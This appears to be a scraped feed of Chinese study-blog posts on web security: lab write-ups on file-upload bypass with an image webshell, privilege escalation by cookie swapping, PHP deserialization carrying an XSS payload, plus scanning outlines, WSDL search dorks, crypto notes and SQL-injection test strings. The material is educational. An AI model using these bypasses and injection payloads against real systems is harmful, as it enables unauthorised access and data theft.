<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="client-check-前端验证"><a href="#client-check-前端验证" class="headerlink" title="client check(前端验证)"></a>client check(前端验证)</h3><p>记住,所有在前端进行验证的都不是靠谱的,如果网站是设计在前端进行验证的,首先考虑先把js给禁用掉。<br>这里首先直接上传一个.php文件,发现我还没点提交,他就直接提示报错信息,说明是一个前端验证。<br><img src="https://pic.imgdb.cn/item/652fd3adc458853aef928935.png" alt="图十三" title="图十三"><br>这里直接成功了,可以上传.php文件。</p>
<h3 id="MIME信息验证"><a href="#MIME信息验证" class="headerlink" title="MIME信息验证"></a>MIME信息验证</h3><p>直接在burpsuite抓包,把Content-Type信息改成图片形式的即可,我这里是png<br><img src="https://pic.imgdb.cn/item/652fd5a0c458853aef995514.png" alt="图十四" title="图十四"></p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><code class="hljs arduino">image/png<br>image/jpg<br></code></pre></td></tr></table></figure>
<p>等都可以,这里可以看到成功上传了,尝试访问一下这个文件。(文件路径一般通过路径扫描可以知道把?)<br><img src="https://pic.imgdb.cn/item/652fd635c458853aef9b62a3.png" alt="图十五" title="图十五"></p>
<h3 id="getimagesize-验证"><a href="#getimagesize-验证" class="headerlink" title="getimagesize 验证"></a>getimagesize 验证</h3><p>这道题着重记录一下。<br>首先直接上传一个.php文件,发现<br><img src="https://pic.imgdb.cn/item/652fdb58c458853aefaf5a93.png" alt="图十六" title="图十六"><br>这里上网查了一下getimagesize()函数的作用。<br>getimagesize()：<a href="https://www.php.cn/faq/562666.html">https://www.php.cn/faq/562666.html</a><br>总的来说就是判断是否为图像类型,那么大小写,截断,重写等花里胡哨的方法失效。<br>只能上传图片马,先制作图片马。</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">copy shana<span class="hljs-selector-class">.png</span> + <span class="hljs-number">2</span><span class="hljs-selector-class">.php</span> c.png<span class="hljs-comment">//c.png是合成后的图片名字</span><br></code></pre></td></tr></table></figure>
<p>直接上传这张图片。<br>此时虽然成功上传,但是网站没有发现有解析漏洞,所以不能被当成.php文件执行,那么活用思路,结合文件包含漏洞。<br><img src="https://pic.imgdb.cn/item/652fdc92c458853aefb43f64.png" alt="图十七" title="文件上传漏洞配合远程包含实现渗透"><br>由于这种思路是看了别人的writeup的,有启发,特别记录一下。</p>
<h2 id="逻辑越权"><a href="#逻辑越权" class="headerlink" title="逻辑越权"></a>逻辑越权</h2><h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><p>登录lucy账户,随后在地址栏上修改即可,较简单。<br><img src="https://pic.imgdb.cn/item/65334930c458853aefc9aa39.png" alt="图十八"></p>
<h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><p>先用超级用户登录,创建一个新的用户并抓包,放出去(目的是为了在http history留下记录)。<br>然后用普通用户登录,注意:登录时要抓包,复制个人的cookie信息。<br><img src="https://pic.imgdb.cn/item/653347b2c458853aefc50c33.png" alt="图十八" title="图十八"><br>然后把之前超级用户的数据包发送到重发器中去,把cookie换成刚才复制的,刷新界面,即可看到之前的数据又添加了一份,这里的数据可以在抓包工具里面改成自己想要的,这样就说明存在垂直越权漏洞。<br><img src="https://pic.imgdb.cn/item/653347b7c458853aefc51b88.png" alt="图十九" title="图十九"></p>
<h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><p>1、水平越权较好利用,只要你在登陆的时候看见网址栏存在和你用户名一样的值,就可以尝试修改(有时候是编号),这样可以达到在你的界面无需密码从而登录到别的用户的主页。<br>2、水平越权更多的是造成用户数据的隐私泄漏:而垂直越权是造成系统权限的泄漏,可能会使网站遭到破坏。<br>3、但是感觉垂直越权的实现和csrf一样难以实现,必须要借助管理员登陆过且操作过截获到的数据包才可操作。</p>
<h2 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h2><p>上面两道题都是无类情况,该情况构造序列化payload的代码相对简单,接下来是学习有类情况下如何构造payload。<br>由于是本地靶场,那么我可以先查看源码。<br><img src="https://pic.imgdb.cn/item/6538773ec458853aefe880ac.jpg" alt="图九" title="代码审计"><br>发现存在一个class类,而且存在一个创建对象会触发的魔术方法,那么可以考虑利用,但是发现就算利用的上也没啥大用,总不能改别人代码吧。此路不通,那么往下看,发现一个判断,意思是如果是接收的是序列化的值,那么会转为对象并赋值给unser;如果不是序列化的值,没用。<br>而且,它的打印输出语句不是echo,那么就要考虑写js语句(觉得应该是如果简单输出字符串,那么就对获取信息没啥用,所以考虑可获取cookie的js语句)。<br>构造payload(编程,目的是把payload序列化):</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">S</span></span>&#123; <span class="hljs-comment">//创建一个类</span><br>   <span class="hljs-keyword">var</span> <span class="hljs-variable">$test</span>=<span class="hljs-string">&quot;pikachu&quot;</span>;<span class="hljs-comment">//赋初值</span><br>&#125;<br><span class="hljs-variable">$whoami</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">S</span>();<span class="hljs-comment">//创建一个对象</span><br><span class="hljs-variable">$payload</span>=<span class="hljs-string">&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;</span>;<span class="hljs-comment">//构造payload,获取cookie</span><br><span class="hljs-variable">$whoami</span>-&gt;test=<span class="hljs-variable">$payload</span>;<span class="hljs-comment">//传输payload</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$whoami</span>);<span class="hljs-comment">//输出序列化的内容</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>关于上述代码的注意点:<br>如果对方有类,那么你构造的代码必须也含有类(类名也要相同),然后创建一个对象传输你要传输的数据(我称之为一一对应)。<br>运行后,获取到序列化的payload:</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;S&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;s:<span class="hljs-number">39</span>:<span class="hljs-string">&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/65387749c458853aefe8a472.jpg" alt="图十" title="代码构造payload"><br>把这句payload放入文本框,并submit，成功弹出cookie信息。<br><img src="https://pic.imgdb.cn/item/65387753c458853aefe8caac.jpg" alt="图十一" title="成功弹出cookie"></p>
]]></content>
      <tags>
        <tag>实战练习心得</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞探测发现|os|web|app|api接口|端口|探针</title>
    <url>/2023/10/29/osTanzhen/</url>
    <content><![CDATA[<h2 id="os-大纲"><a href="#os-大纲" class="headerlink" title="os|大纲"></a>os|大纲</h2><p><img src="https://pic.imgdb.cn/item/653e6cb0c458853aefcf5f00.jpg" alt="图一" title="对于如何发现操作系统漏洞的大纲"></p>
<h3 id="操作系统漏洞发现"><a href="#操作系统漏洞发现" class="headerlink" title="操作系统漏洞发现"></a>操作系统漏洞发现</h3><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=41&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">讲解整体知识点,简要概况:2:00</a><br>1、操作系统漏洞发现的意义:安全测试的目标是一个网站或者是服务器上面的一个应用(服务)。如果说操作系统存在漏洞,那么我们就不用对于这特定的服务或者应用进行漏洞发现。比如说对于一个网站,抛开网站本身的漏洞不谈,如果其服务器上的操作系统存在漏洞,我们可以获取其os的权限,从而可以直接获取网站|服务器的权限。<br>2、对os漏洞进行分类,可以知道后期在利用时需不需要前提条件(如是否需要一个低权限),以及有啥效果。<br>3、如何预知漏洞:需要大量经验。</p>
<h3 id="os漏洞发现-具体分析"><a href="#os漏洞发现-具体分析" class="headerlink" title="os漏洞发现|具体分析"></a>os漏洞发现|具体分析</h3><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=41&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">第一部分:漏洞探针:6:10</a><br>对于os层面的漏洞,大部分是依靠工具进行探针。<br>1、Goby:<a href="https://blog.csdn.net/m0_59856951/article/details/131112658">https://blog.csdn.net/m0_59856951/article/details/131112658</a><br>2、Nmap:<br>(1)、Nmap –script&#x3D;vuln 网段ip –默认nse插件(参数)<br>(2)、Nmap vulscan vulners 网段ip –调用第三方库探针(vulscan vulners较为知名)<br>加入拓展扫描模块:<a href="https://cnblogs.com/shwang/p/12623669.html">https://cnblogs.com/shwang/p/12623669.html</a><br>3、Nessus:<a href="https://blog.csdn.net/qq_51577576/article/details/123211031">https://blog.csdn.net/qq_51577576/article/details/123211031</a><br>扫得最全面但安装配置麻烦。<br>介绍一些概念:<br><a href="https://blog.csdn.net/dzqxwzoe/article/details/129024273">https://blog.csdn.net/dzqxwzoe/article/details/129024273</a><br><a href="https://blog.csdn.net/A_991128a/article/details/133786308">https://blog.csdn.net/A_991128a/article/details/133786308</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=41&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">第二部分:漏洞类别区分讲解-权限提升、远程执行、缓冲区溢出(思路):31:10</a><br>1、较有用的三种os漏洞类型:远程执行、权限提升、缓冲区溢出。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=41&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">第三部分:漏洞利用框架演示(具体操作在48:10):38:10</a><br>1、发现os漏洞如何利用(寻找有没有可以用的exp):<br>(1)、工具框架：Metasploit、Searchploit–kali、忍者系统有。<br>(2)、单点exp：seebug、cnvd、1337day、exploit-db、github。<br>(3)、网上文章复现(类似于wp)–也可以在github找可以用的。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=41&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">第四部分:修复:1:12:10</a><br>1、打补丁<br>2、关闭入口(端口)<br>3、防护应用</p>
<h2 id="WEB-大纲"><a href="#WEB-大纲" class="headerlink" title="WEB|大纲"></a>WEB|大纲</h2><p><img src="https://pic.imgdb.cn/item/6541a3f7c458853aefe36fe9.png" alt="图二" title="对于如何发现WEB应用漏洞的大纲"></p>
<h3 id="WEB应用漏洞探测发现"><a href="#WEB应用漏洞探测发现" class="headerlink" title="WEB应用漏洞探测发现"></a>WEB应用漏洞探测发现</h3><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=42&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">对以下三类的一个讲解:1:20</a><br>1、已知 CMS<br>如常见的 dedecms.discuz(论坛),wordpress(博客) 等源码结构(自己开发的,并公开到网上)，这种一般采用非框架类开发，但也有少部分采用的<br>是框架类开发，针对此类源码程序的安全检测，我们要利用公开的漏洞进行测试，如不存在可采用<br>白盒代码审计自行挖掘。<br>2、开发框架<br>如常见的 thinkphp，spring,flask 等开发的源码程序，这种源码程序正常的安全测试思路：先获取对<br>应的开发框架信息(名字，版本)，通过公开的框架类安全问题进行测试，如不存在可采用白盒代码审<br>计自行挖掘。<br>3、未知 CMS<br>如常见的企业或个人内部程序源码，也可以是某 CMS 二次开发的源码结构，针对此类的源码程序测<br>试思路：能识别二次开发就按已知 CMS 思路进行，不能确定二次开发的话可以采用常规综合类扫描<br>工具或脚本进行探针，也可以采用人工探针（功能点，参数，盲猜），同样在有源码的情况下也可以<br>进行代码审计自行挖掘。</p>
<h3 id="web应用漏洞发现-具体分析"><a href="#web应用漏洞发现-具体分析" class="headerlink" title="web应用漏洞发现|具体分析"></a>web应用漏洞发现|具体分析</h3><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=42&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">开发框架类源码渗透测试报告-资讯-thinkphp,spring:16:40</a><br>1、故意输错网址看报错信息有概率可以爆出开发的框架信息。<br>2、主要就是用扫描工具扫,看有没有爆出开发框架类型甚至其漏洞也爆出来,随后利用网络搜索搜这个漏洞。&#96;<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=42&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">已知 CMS 非框架类渗透测试报告-工具脚本-wordpress:35:00</a><br>1、识别cms:人工抓包;网站;工具(wpscan–检测wordpress这种cms:kali自带)。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=42&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde"> 已知 CMS 非框架类渗透测试报告-代码审计-qqyewu_php:50:00</a><br>1、这种一般是小公司自己开发一套网站源码自己用,所以上网搜索搜不到,代码框架也分析不出来是哪套,cms已知但由于过于小众网上搜不到漏洞,但是我们有源码,可以自己代码审计。<br>2、不得已情况下使用,看源码的时间很长,考验代码功底以及经验。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=42&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde"> 未知 CMS 非框架类渗透测试报告-人工-你我都爱的 wg 哦~(实际案例):1:04:00</a><br>1、听思路，很重要。(最后这20分钟可以复刷)<br>2、robots.txt-&gt;上网搜-&gt;尝试登陆后台-&gt;扫端口-&gt;测试有无源码备份文件(目录扫描)–找数据库备份文件,后面看可不可以根据配置信息里面的账号密码可不可以连接数据库。<br>学习资源:<a href="https://blog.csdn.net/qq_53079406/article/details/124475440(%E8%BE%83%E5%85%A8)">https://blog.csdn.net/qq_53079406/article/details/124475440(较全)</a></p>
<h2 id="APP-大纲"><a href="#APP-大纲" class="headerlink" title="APP|大纲"></a>APP|大纲</h2><p><img src="https://pic.imgdb.cn/item/65436148c458853aef686897.png" alt="图三" title="对于如何发现APP漏洞的大纲"></p>
<h2 id="APP-具体分析"><a href="#APP-具体分析" class="headerlink" title="APP|具体分析"></a>APP|具体分析</h2><p><img src="https://pic.imgdb.cn/item/654361abc458853aef698547.jpg" alt="图四" title="对于如何发现APP漏洞的思路"><br>1、建议反编译(逆向)以及抓包都进行,避免前期因为信息收集不够全面或者其他问题而导致的遗漏<br>2、如果app不使用web协议开发,采用网络接口抓包方法–wireshark(非web)<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=42&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">抓包工具web协议面使用说明:8:20</a><br>1、get一个知识点:在网址栏后面加入一个’：如果报错猜测有注入点;如果还是原来网站页面,猜测不存在注入<br>2、Charles,推荐这个工具抓app的数据包(但是仅仅只可以看,不可以重发这个数据包)<br>3、手机端的数据包为什么电脑访问不了? 这个包只可以手机访问–由于内核不同,存在检测<br>4、利用kali自带的xray:实现访问手机网站时,浏览器访问不了,但是要对它进行扫描的操作<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=42&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">抓包工具非web协议面使用说明–wireshark:49:00</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=42&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">安卓逆向便捷APK一键提取URL演示(反编译):54:50</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=42&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">利用Burp筛选以及联动功能打出军体拳(Burp+xray):1:00:37</a><br><code>联动的目的是为了被动扫描和手工测试漏洞同时进行</code><br>自己学习:<a href="https://blog.csdn.net/weixin_46318141/article/details/121239422">https://blog.csdn.net/weixin_46318141/article/details/121239422</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=42&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">模拟器四个违法案例app安全分析测试:1:10:37</a><br><code>其实app类型的也是web,是web上面多了一层包装而已,app类型撕开包装也是web</code></p>
<h2 id="API接口-端口服务-大纲"><a href="#API接口-端口服务-大纲" class="headerlink" title="API接口|端口服务|大纲"></a>API接口|端口服务|大纲</h2><p><img src="https://pic.imgdb.cn/item/65449afbc458853aefa7c733.png" alt="图五" title="对于如何发现API接口|端口服务漏洞的大纲"><br><code>信息收集之信息利用|进阶拓展</code><br>第一步：首先识别网站是否有cdn，waf等产品，有则绕过。<br>第二步：扫描收集到网站的端口信息，真实ip地址，ip绑定的其他域名。<br>第三步：网站敏感路径扫描<br>第四步：域名+端口敏感信息扫描<br>第五步：ip+端口敏感目录扫描<br>备注：字典不应该只是敏感路径，还应该有备份文件 zip rar tar tar.gz等格式文件</p>
<p><code>端口服务类安全测试</code><br>根据前期信息收集针对目标端口服务类探针后进行的安全测试，主要涉及攻击方法：口令安全，WEB<br>类漏洞，版本漏洞等，其中产生的危害可大可小。属于端口服务&#x2F;第三方服务类安全测试面。一般在<br>已知应用无思路的情况下选用的安全测试方案。</p>
<p><code>API接口类安全测试</code><br>根据应用自身的功能方向决定，安全测试目标需有 API 接口调用才能进行此类测试，主要涉及的安<br>全问题：自身安全，配合 WEB，业务逻辑等，其中产生的危害可大可小，属于应用 API 接口网络服<br>务测试面，一般也是在存在接口调用的情况下的测试方案。<br>WSDL（网络服务描述语言，Web Services Description Language）是一门基于 XML 的语言，用于描述<br>Web Services 以及如何对它们进行访问(网络接口的数据传输语言)。<br>参考学习:<a href="https://xz.aliyun.com/t/2412">https://xz.aliyun.com/t/2412</a><br><code>发现网站的API接口漏洞关键字</code><br>配合 shodan，fofa,zoomeye 搜索也不错哦~<br>inurl:jws?wsdl<br>inurl:asmx?wsdl<br>inurl:aspx?wsdl<br>inurl:ascx?wsdl<br>inurl:ashx?wsdl<br>inurl:dll?wsdl<br>inurl:exe?wsdl<br>inurl:php?wsdl<br>inurl:pl?wsdl<br>inurl:?wsdl<br>filetype:wsdl wsdl<br><img src="https://pic.imgdb.cn/item/65449b58c458853aefa8d097.png" alt="图六" title="常见漏洞"></p>
<h2 id="API接口-端口服务-具体分析"><a href="#API接口-端口服务-具体分析" class="headerlink" title="API接口|端口服务|具体分析"></a>API接口|端口服务|具体分析</h2><h3 id="端口服务"><a href="#端口服务" class="headerlink" title="端口服务"></a>端口服务</h3><p><code>1、有时候打开一个网站带上其接口,但是打开网站后接口会被屏蔽;若接口没有屏蔽,可尝试手动去掉接口,可能看到到另一套程序。</code><br><code>2、查同一网站所有者不同域名思路(仅后缀不同):直接上域名注册的网站搜,看有哪个域名被注册了。(随后分别进行子域名收集)</code><br><code>3、不仅要域名扫描、ip扫描:还要端口扫描、目录扫描(敏感文件扫描、dirsearch工具)</code><br><code>4、端口扫描:MASSCAN、nmap、goby、Nessus</code>–扫主机,范围更广。</p>
<h3 id="Web-Services–API接口-P45-1-10-00"><a href="#Web-Services–API接口-P45-1-10-00" class="headerlink" title="Web Services–API接口(P45:1:10:00)"></a>Web Services–API接口(P45:1:10:00)</h3><p><code>5、接下来就接口层,漏扫工具:Acunetix(AWVS)</code>–专门扫web具体漏洞如(SQL)。自动化的 Web 应用程序安全测试工具，是通过检查 SQL 注入，跨站点脚本（XSS）和其他可利用漏洞等来审核 Web 应用程序。一般来说，Acunetix 能够扫描任何通过网络浏览器访问并使用 HTTP&#x2F;HTTPS 协议的网站或 web 应用程序。<br>使用:<a href="https://blog.csdn.net/weixin_45723896/article/details/131409802">https://blog.csdn.net/weixin_45723896/article/details/131409802</a></p>
]]></content>
      <categories>
        <category>漏洞探测发现</category>
      </categories>
      <tags>
        <tag>漏洞探测发现</tag>
      </tags>
  </entry>
  <entry>
    <title>对称密码以及非对称密码</title>
    <url>/2023/10/16/serectADR/</url>
    <content><![CDATA[<h2 id="对称密钥加密"><a href="#对称密钥加密" class="headerlink" title="对称密钥加密"></a>对称密钥加密</h2><h3 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>AES（Advanced Encryption Standard，高级加密标准）算法，是一种对称密钥加密算法，用于保护敏感数据的机密性。它是目前广泛应用的加密算法之一，被认为是最安全的对称加密算法之一。<br>AES基本概要:<a href="https://blog.csdn.net/m0_72410588/article/details/132449867">https://blog.csdn.net/m0_72410588/article/details/132449867</a></p>
<h4 id="原理以及结构"><a href="#原理以及结构" class="headerlink" title="原理以及结构"></a>原理以及结构</h4><p>1、AES算法采用分组密码的形式，将明文数据划分为固定长度（128比特）的数据块，并通过多轮的加密操作，将明文转换为密文。AES算法具有三种不同的密钥长度：128比特、192比特和256比特，分别对应AES-128、AES-192和AES-256。<br>2、AES 的加密公式为 C&#x3D;E(K,P)，其中 K 为密钥，P 为明文，C 为密文。</p>
<h4 id="AES的加密过程"><a href="#AES的加密过程" class="headerlink" title="AES的加密过程"></a>AES的加密过程</h4><p>AES加密过程主要包括以下四个步骤：<br>密钥扩展：根据输入的密钥生成一系列轮密钥，用于后续的轮函数操作。<br>初始轮：将输入数据与第一轮密钥进行异或运算。<br>多轮加密：通过执行多个相同的轮函数，对输入数据进行重复的变换和替代操作。<br>最后一轮：在最后一个轮函数中，不使用MixColumns操作，并将输出数据与最后一轮密钥进行异或运算<br>具体加密过程:<a href="https://www.jianshu.com/p/fff19c19eb09">https://www.jianshu.com/p/fff19c19eb09</a></p>
<h4 id="AES的解密过程"><a href="#AES的解密过程" class="headerlink" title="AES的解密过程"></a>AES的解密过程</h4><p>AES解密过程与加密过程相似，只是逆向执行了加密过程的步骤。通过反向操作，密文可以被还原为明文。</p>
<h3 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h3><h4 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h4><p>DES是一种对称加密算法（对称加密即加密和解密用的是同一个秘钥）。<br>DES是一个分组加密算法，就是将明文分组进行加密，每次按顺序取明文一部分，一个典型的DES以64位为分组，加密解密用算法相同。它的密钥长度为56位，因为每组第8位是用来做奇偶校验，密钥可以是任意56位的数，保密性依赖于密钥。 DES算法的核心主要包括两部分，第一部分是Feistel结构，第二部分是16个子密钥的生成。</p>
<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>DES算法为密码体制中的对称密码体制，⼜被称为美国数据加密标准。DES是⼀个分组加密算法，典型的DES以64位为分组对数据加密，加密和解密⽤的是同⼀个算法。<br>密钥长64位，密钥事实上是56位参与DES运算（第8、16、24、32、40、48、56、64位是校验位，使得每个密钥都有奇数个1），分组后的明⽂组和56位的密钥按位替代或交换的⽅法形成密⽂组。<br>参考以及DES具体过程:<br><a href="https://zhuanlan.zhihu.com/p/575214691">https://zhuanlan.zhihu.com/p/575214691</a><br><a href="https://blog.csdn.net/it_is_me_a/article/details/102463573">https://blog.csdn.net/it_is_me_a/article/details/102463573</a></p>
<h2 id="非对称加密算法"><a href="#非对称加密算法" class="headerlink" title="非对称加密算法"></a>非对称加密算法</h2><h3 id="与对称加密算法的对比"><a href="#与对称加密算法的对比" class="headerlink" title="与对称加密算法的对比"></a>与对称加密算法的对比</h3><p>对称加密算法：<br>（1）甲方选择某一种加密规则，对信息进行加密；<br>（2）乙方使用同一种规则，对信息进行解密。<br>缺点：甲方必须把加密规则告诉乙方，否则无法解密。保存和传递密钥，就成了最头疼的问题。<br>非对称加密算法:<br>（1）乙方生成两把密钥（公钥和私钥）。公钥(发给对方用于加密数据)是公开的，任何人都可以获得，私钥则是保密的。<br>（2）甲方获取乙方的公钥，然后用它对信息加密。<br>（3）乙方得到加密后的信息，用私钥解密。<br>如果公钥加密的信息只有私钥解得开，那么只要私钥不泄漏，通信就是安全的。</p>
<h3 id="杰出代表–RSA加密算法"><a href="#杰出代表–RSA加密算法" class="headerlink" title="杰出代表–RSA加密算法"></a>杰出代表–RSA加密算法</h3><p>1、重要的概念–密钥对,即是包含一个公钥与一个私钥。<br>2、RSA加密算法的原理:<a href="https://blog.csdn.net/Insect_boy/article/details/130528667">https://blog.csdn.net/Insect_boy/article/details/130528667</a><br>3、加解密原理以及过程:<br>   <a href="https://blog.csdn.net/qq_43013511/article/details/123115880">https://blog.csdn.net/qq_43013511/article/details/123115880</a><br>   <a href="https://blog.csdn.net/chengqiuming/article/details/82725137">https://blog.csdn.net/chengqiuming/article/details/82725137</a><br>4、对称加密与非对称加密的对比以及详解非对称加密:<br><a href="https://zhuanlan.zhihu.com/p/436455172?utm_id=0&wd=&eqid=de46b7d2001e070a00000006645769d0">https://zhuanlan.zhihu.com/p/436455172?utm_id=0&amp;wd=&amp;eqid=de46b7d2001e070a00000006645769d0</a><br>5、按照我的理解就是：<br>Bob发送信息给Alice,首先Alice得把自己的公钥发送给Bob,Bob用这个公钥对信息进行加密然后用自己的私钥对这个加密后的信息进行数字签名。然后Bob把签名后的加密信息以及Bob自己的公钥发送给Alice,Alice收到后,先用Bob的公钥对这个信息进行验证,确认这个信息确实是来自于Bob后,随后用自己的私钥进行解密。<br>6、实现前提,使用单向陷门函数。即加密简单,解密时对于敌手难,对于用户简单。</p>
]]></content>
      <categories>
        <category>应用密码学</category>
      </categories>
      <tags>
        <tag>应用密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入练习遇到的问题</title>
    <url>/2023/10/03/sqlPratice/</url>
    <content><![CDATA[<h2 id="SQL注入练习遇到的问题"><a href="#SQL注入练习遇到的问题" class="headerlink" title="SQL注入练习遇到的问题"></a>SQL注入练习遇到的问题</h2><p>1、报错盲注时(insert与update型),语句的插入位置<br>心得:在解题时,若注册输入的数据是字符串型的(如用户名),则不建议在其后插入(会出现一个截断错误),尽量在纯数字后面(如电话)插入。<br><img src="https://pic.imgdb.cn/item/6522b245c458853aeffc7f61.png" alt="图一" title="一"><br><img src="https://pic.imgdb.cn/item/6522b23ec458853aeffc7df2.png" alt="图二" title="二"><br>2、limit 0,1表示从第一行开始取一个。<br>3、若是删除记录(delete),直接在get请求的参数值(如id)后面注入(报错盲注)。<br>4、注意在bp当中，get请求当中去输入sql语句时，空格用+替代，否则会出现问题。</p>
]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>实战练习心得</tag>
      </tags>
  </entry>
  <entry>
    <title>初步理解SQL注入（一）</title>
    <url>/2023/09/11/two/</url>
    <content><![CDATA[<h2 id="初步理解SQL注入（一）"><a href="#初步理解SQL注入（一）" class="headerlink" title="初步理解SQL注入（一）"></a>初步理解SQL注入（一）</h2><figure class="highlight makefile"><table><tr><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">爆库:获取数据库名</span><br><span class="hljs-section">爆表:获取表名</span><br></code></pre></td></tr></table></figure>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>SQL注入的原理是利用应用程序在构建SQL查询语句时未对用户输入进行充分的验证和过滤。<br>攻击者可以通过在输入字段中插入特殊字符或SQL语句片段，改变原始的SQL查询逻辑，从而执行恶意操作。</p>
<h3 id="分类–严格意义来说这样分类是错误的，应该用数据库名命名"><a href="#分类–严格意义来说这样分类是错误的，应该用数据库名命名" class="headerlink" title="分类–严格意义来说这样分类是错误的，应该用数据库名命名"></a>分类–严格意义来说这样分类是错误的，应该用数据库名命名</h3><h4 id="基于错误的注入"><a href="#基于错误的注入" class="headerlink" title="基于错误的注入"></a>基于错误的注入</h4><h4 id="盲注注入"><a href="#盲注注入" class="headerlink" title="盲注注入"></a>盲注注入</h4><h4 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h4><h4 id="命令执行注入"><a href="#命令执行注入" class="headerlink" title="命令执行注入"></a>命令执行注入</h4><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p> 攻击者可以通过构造恶意的输入数据，包括SQL语句片段、特殊字符和转义序列等，来利用SQL注入漏洞。<br> 利用的目的可以包括绕过身份验证、获取敏感数据、修改数据库内容或执行任意的操作等。</p>
<h3 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h3><p>使用参数化查询或预编译语句，确保输入数据与查询逻辑分离。<br>对用户输入进行严格的验证和过滤，包括输入长度、数据类型和特殊字符等。<br>最小化数据库账户的权限，限制对数据库的操作。<br>定期更新和修补应用程序，以修复已知的SQL注入漏洞。<br>使用Web应用程序防火墙（WAF）等安全工具来检测和阻止SQL注入攻击。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">注入“万能”公式<br>字符型:<br>1<span class="hljs-string">&#x27; or 1=1 #</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1 #<br>1<span class="hljs-string">&#x27; or 1=1 --   --后面加空格否则报错</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1 --   --后面加空格否则报错<br><span class="hljs-string">&#x27; or &#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1<br> 数字型:<br> 1 <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1 #--以此类推<br></code></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>web漏洞必备知识</title>
    <url>/2023/09/20/webLoudongZonghe/</url>
    <content><![CDATA[<h2 id="web漏洞必备知识"><a href="#web漏洞必备知识" class="headerlink" title="web漏洞必备知识"></a>web漏洞必备知识</h2><p>基础名词认识:<a href="https://blog.csdn.net/Spontaneous_0/article/details/129462860">https://blog.csdn.net/Spontaneous_0/article/details/129462860</a></p>
